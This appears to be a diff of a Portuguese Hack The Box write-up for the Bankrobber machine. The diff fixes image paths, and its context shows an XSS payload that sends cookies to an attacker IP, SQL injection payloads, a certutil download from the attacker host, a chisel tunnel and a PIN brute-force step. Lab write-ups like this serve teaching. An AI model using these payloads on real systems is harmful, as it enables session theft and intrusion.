@@ -20,9 +20,9 @@ Esta máquina é uma boa máquina para ter noção de como pode uma sequência d
 
 Assim como em todas as máquinas, a fase inicial é a fase de enumeração. E nesta fase, enumeramos sempre em primeiro lugar as portas activas da máquina... São os pontos de entrada, por isso temos obrigação de saber todos os pontos de entrada para só depois ver que tipo de falhas poderá haver.
 
-![nmap allPorts](Assets\HTB-Windows-Insane-Bankrobber\allPorts.png)
+![nmap allPorts](Assets/HTB-Windows-Insane-Bankrobber/allPorts.png)
 
-![nmap nmap-A](Assets\HTB-Windows-Insane-Bankrobber\nmap-A.png)
+![nmap nmap-A](Assets/HTB-Windows-Insane-Bankrobber/nmap-A.png)
 
 A primeira vista, nada de extraordinário. Mas mesmo assim á pontos importantes a realçar.
 
@@ -33,7 +33,7 @@ A primeira vista, nada de extraordinário. Mas mesmo assim á pontos importantes
 
 ## WebSite
 
-![Página inicial](Assets\HTB-Windows-Insane-Bankrobber\Pagina_Inicial_Login-E-coin.png)
+![Página inicial](Assets/HTB-Windows-Insane-Bankrobber/Pagina_Inicial_Login-E-coin.png)
 
 Esta página é muito em chuto. Não tem grande coisa, o que é bom para focar nos problemas, e não andar a procura de agulhas. Existe uma secção de login e outra de registo.
 
@@ -43,23 +43,23 @@ Agora o proximo passo é criar um usuário e vasculhar o Site.
 
 Tentei criar o usuário admin, e aí apareceu um erro:
 
-![Registering admin](Assets\HTB-Windows-Insane-Bankrobber\registering_admin.png)
+![Registering admin](Assets/HTB-Windows-Insane-Bankrobber/registering_admin.png)
 
 Bom, aí já não está bom... esta mensagem de erro ajuda-nos a enumerar possíveis usuários. Parece que o usuário "admin" existe...
 
 Criei então o usuário javali:javali
 
-![Registering javali](Assets\HTB-Windows-Insane-Bankrobber\javali_created.png)
+![Registering javali](Assets/HTB-Windows-Insane-Bankrobber/javali_created.png)
 
 E com esse novo usuário, foi possível fazer o login.
 
-![Logged as javali](Assets\HTB-Windows-Insane-Bankrobber\logged_as_javali.png)
+![Logged as javali](Assets/HTB-Windows-Insane-Bankrobber/logged_as_javali.png)
 
 Outra página muito em chuto, o que nos ajuda a saber por que caminho andar... os 2 primeiros campos estão limitados para se poder introduzir apenas números. Alterando isso, logo do navegador ou por burpsuite nada muda. O alvo é mesmo o campo de comentário.
 
 Cada vez que se carregue em "transfere coin", aparece um alerta que nos diz que a nossa petição irá se avaliado por um administrador...
 
-![Admin Review](Assets\HTB-Windows-Insane-Bankrobber\admin_review.png)
+![Admin Review](Assets/HTB-Windows-Insane-Bankrobber/admin_review.png)
 
 Já que, aparentemente, esta máquina está a dizer que um administrator irá abrir a transação dentro de instantes, poderá significar ques existe alguma tarefa automática que simula um administrador a abrir a nossa mensagem. Vamos primeiro tratar de identificar se existe uma falha conhecida como XSS (Cross-site scripting), introduzindo no campo de comentário o seguinte código:
 
@@ -85,7 +85,7 @@ request.open('GET', 'http://10.10.14.9/test.js?cookie=' + document.cookie, true)
 request.send()
 ```
 
-![Cookie hijack](Assets\HTB-Windows-Insane-Bankrobber\cookie_hijack.png)
+![Cookie hijack](Assets/HTB-Windows-Insane-Bankrobber/cookie_hijack.png)
 
 Na imagem, é possível ver o cookie de um usuário (supostamente administrador pelo que o alerta nos informou). Esse cookie está "encoded". Primeiro podemos reverter o "urlencoded" com ajuda do php em modo interativo. O resultado é o seguinte:
 
@@ -95,11 +95,11 @@ username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1
 
 Isto não é o username e password em texto claro. Mas pelo formato, é facilmente identificável. Vamos tentar descodificar:
 
-![Credenciais do administrador](Assets\HTB-Windows-Insane-Bankrobber\admin_credenciais.png)
+![Credenciais do administrador](Assets/HTB-Windows-Insane-Bankrobber/admin_credenciais.png)
 
 Com essas credenciais, podemos efetuar logout, e login com as credenciais do usuário "admin"
 
-![Admin page](Assets\HTB-Windows-Insane-Bankrobber\admin_page.png)
+![Admin page](Assets/HTB-Windows-Insane-Bankrobber/admin_page.png)
 
 Esta página está também bastante cru, e já dá para planear coisas.
 
@@ -111,11 +111,11 @@ Vamos abordar por enquanto apenas o campo ID.
 
 Se pusermos um número, podemos ver usuários:
 
-![Search User](Assets\HTB-Windows-Insane-Bankrobber\search_user_sqli.png)
+![Search User](Assets/HTB-Windows-Insane-Bankrobber/search_user_sqli.png)
 
 Com já sabemos que existe provavelmente uma base de dados em mysql (NMAP em força), vamos tentar coisas sombrias!
 
-![Search User SQLi error](Assets\HTB-Windows-Insane-Bankrobber\search_user_sqli_error.png)
+![Search User SQLi error](Assets/HTB-Windows-Insane-Bankrobber/search_user_sqli_error.png)
 
 HUUUH xD A aspa simples fatal para a aplicação lol. Isto significa que é vulnerável a SQL Injection.
 
@@ -125,7 +125,7 @@ Agora a simples injeção básica do "or 1=1-- -"
 1' or 1=1-- -
 ```
 
-![Search User SQLi user enumeration](Assets\HTB-Windows-Insane-Bankrobber\search_user_enumeration_users.png)
+![Search User SQLi user enumeration](Assets/HTB-Windows-Insane-Bankrobber/search_user_enumeration_users.png)
 
 Ok. Ai estão todos os usuários. E ainda temos sorte, o php/html está feito para criar linhas para incluir todos os resultado. Não é necessário concatenar nem coisa parecida.
 
@@ -142,7 +142,7 @@ Perceber quantas colunas são
 3' order by 3-- -    # 3 javali
 ```
 
-![SQLi order by 3](Assets\HTB-Windows-Insane-Bankrobber\sqli_order_by_3.png)
+![SQLi order by 3](Assets/HTB-Windows-Insane-Bankrobber/sqli_order_by_3.png)
 
 Perceber quais as colunas cujo resultado aparecem na tela:
 
@@ -150,17 +150,17 @@ Perceber quais as colunas cujo resultado aparecem na tela:
 3' union select 111,222,333-- -
 ```
 
-![Union Select 111,222,333](Assets\HTB-Windows-Insane-Bankrobber\union_select_111,222,333.png)
+![Union Select 111,222,333](Assets/HTB-Windows-Insane-Bankrobber/union_select_111,222,333.png)
 
 Daí para a frente, podemos injectar código para que apareca resultado no 1º ou 2º campo (111,222).
 
 Não me vou atardar mais com SQLi, posso dizer que na base de dados não se vai aprender grande coisa. Mas o mysql tem a possibilidade de ler arquivos do sistema, e esta função não está bloqueada. Vamos tentar ler um ficheiro que temos a certeza que irá existir para testar:
 
-![etc/hosts](Assets\HTB-Windows-Insane-Bankrobber\read_hosts.png)
+![etc/hosts](Assets/HTB-Windows-Insane-Bankrobber/read_hosts.png)
 
 Isto aqui não é nada comodo... Não quiz fazer um script em python, mas ainda há uma outra forma de ver isso de uma forma mais simples. Através de um curl. Com o google chrome, é possível copiar uma petição em formato Curl:
 
-![Copy as Curl](Assets\HTB-Windows-Insane-Bankrobber\copyAsCurl.png)
+![Copy as Curl](Assets/HTB-Windows-Insane-Bankrobber/copyAsCurl.png)
 
 Voltaremos mais tarde a este assunto, porque ainda faltam dados acerca deste puzzle!
 
@@ -168,7 +168,7 @@ Voltaremos mais tarde a este assunto, porque ainda faltam dados acerca deste puz
 
 Na página de administrador existe uma hiperligação para um note.txt
 
-![note.txt](Assets\HTB-Windows-Insane-Bankrobber\note.txt.png)
+![note.txt](Assets/HTB-Windows-Insane-Bankrobber/note.txt.png)
 
 Nessas notas podemos ver que o servidor Web é feito com Xampp, e fala novamente no localhost...
 
@@ -189,7 +189,7 @@ Sabemos que:
 -       Estamos perante um Xampp
 -   Se tentarmos enviar um dir, podemos ver o request, ou através de burpsuite, ou logo pelo navegador:
 
-![dir backdoorchecker.php](Assets\HTB-Windows-Insane-Bankrobber\dir_backdoorchecker.png)
+![dir backdoorchecker.php](Assets/HTB-Windows-Insane-Bankrobber/dir_backdoorchecker.png)
 
 Agora sim temos um pouco de tudo. O ficheiro que nos interessa ver para ver que tipo de filtros existe é o backdoorchecker.php. Que por sua vez se encontra provavelmente em C:\xampp\htdocs\admin\backdoorchecker.php por ser a path de instalação padrão (C:\xampp\htdocs) e o resto vê-se na Request URL da própria petição que fizemos
 
@@ -197,9 +197,9 @@ Agora sim temos um pouco de tudo. O ficheiro que nos interessa ver para ver que 
 
 Este ficheiro é um php o que pode trazer alguns problemas, pois ao ser transferido pode ser interpretado antes de nós podemos visualizar o código fonte. Então para se ver tudo, existe em SQL uma função para converter uma string em base64. A petição foi feita em curl para não ficar tudo deformado, e depois é só descodificá-lo:
 
-![Curl backdoorchecker.php encoded](Assets\HTB-Windows-Insane-Bankrobber\curl_base64_backdoorchecker.png)
+![Curl backdoorchecker.php encoded](Assets/HTB-Windows-Insane-Bankrobber/curl_base64_backdoorchecker.png)
 
-![backdoorchecker.php decoded](Assets\HTB-Windows-Insane-Bankrobber\curl_base64_backdoorchecker_base64-d.png)
+![backdoorchecker.php decoded](Assets/HTB-Windows-Insane-Bankrobber/curl_base64_backdoorchecker_base64-d.png)
 
 Vemos que não podemos utilizar o segunte conjunto:
 
@@ -222,9 +222,9 @@ request.send(params)
 
 -   Obrigar o user "admin" simulado a executar esse javascript:
 
-![rce.js](Assets\HTB-Windows-Insane-Bankrobber\rce.png)
+![rce.js](Assets/HTB-Windows-Insane-Bankrobber/rce.png)
 
-![In the target machine](Assets\HTB-Windows-Insane-Bankrobber\in-the-target-machine.png)
+![In the target machine](Assets/HTB-Windows-Insane-Bankrobber/in-the-target-machine.png)
 
 # PrivEsc
 
@@ -233,14 +233,14 @@ Depois de um café, vamos enumerar um pouco a máquina.
 ```powershell
 netstat -ano
 ```
-![Porta nova](Assets\HTB-Windows-Insane-Bankrobber\newport.png)
+![Porta nova](Assets/HTB-Windows-Insane-Bankrobber/newport.png)
 
 Existe uma porta nova, que não existia no NMAP, por estar bloqueado a nível de firewall para se poder operar apenas por localhost. Porta 910!
 
 ```powershell
 tasklist
 ```
-![tasklist](Assets\HTB-Windows-Insane-Bankrobber\tasklist.png)
+![tasklist](Assets/HTB-Windows-Insane-Bankrobber/tasklist.png)
 
 Através do PID, verificamos que o programa que está a ocupar esta porta é o bankv2.exe.
 
@@ -269,13 +269,13 @@ certutil -urlcache -f http://10.10.14.19/chisel.exe
 chisel.exe client 10.10.14.9:8008 R:910:127.0.0.1:910
 ```
 
-![Server chisel](Assets\HTB-Windows-Insane-Bankrobber\server_chisel.png)
+![Server chisel](Assets/HTB-Windows-Insane-Bankrobber/server_chisel.png)
 
 A partir de agora, a porta 910 da minha máquina local kali é igual á da máquina alvo.
 
 Se usarmos um simples nc, dá para ver o que se lá passa:
 
-![Local 910](Assets\HTB-Windows-Insane-Bankrobber\local910.png)
+![Local 910](Assets/HTB-Windows-Insane-Bankrobber/local910.png)
 
 Está protegido por um PIN. Como está na nossa máquina, e sempre que tento um PIN, o programa apenas se fecha e está pronto para outra, vou fazer brute force nele!!
 
@@ -320,19 +320,19 @@ main()
 ```
 Com esse simples script, vou testando todos os PINs até que me reporta qual é:
 
-![PIN](Assets\HTB-Windows-Insane-Bankrobber\pin.png)
+![PIN](Assets/HTB-Windows-Insane-Bankrobber/pin.png)
 
 A partir daí, deu para perceber que, em vez de colocar um valor de transferência, se puser montes de caracteres, estou a reescrever a parte que dizia "[$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe". E visto que este caminho é de "admin", pode-se assumir que essa ferramenta será executada com privilégios de administrador... Não esquecer de preparar o nc em modo de escuta.
 
-![BufferOverFlow](Assets\HTB-Windows-Insane-Bankrobber\bufferOverflow.png)
+![BufferOverFlow](Assets/HTB-Windows-Insane-Bankrobber/bufferOverflow.png)
 
 Dá para tentar reescrever o commando que é suposto aparecer ali, para ver o que acontece. Depois de perceber quantos caracteres são precisos para reescrever o comando (32 caracteres), é só concatenar a essas 32 caracteres, um comando nosso:
 
-![Admin RCE](Assets\HTB-Windows-Insane-Bankrobber\admin_pwned.png)
+![Admin RCE](Assets/HTB-Windows-Insane-Bankrobber/admin_pwned.png)
 
 Isto não é bem um BufferOverFlow, mas a base é a mesma. Reescrever uma instrução. 
 
-![Admin whoami](Assets\HTB-Windows-Insane-Bankrobber\admin_whoami_authority-system.png)
+![Admin whoami](Assets/HTB-Windows-Insane-Bankrobber/admin_whoami_authority-system.png)
 
 As flags estão sempre no mesmo sítio...
 ```powershell
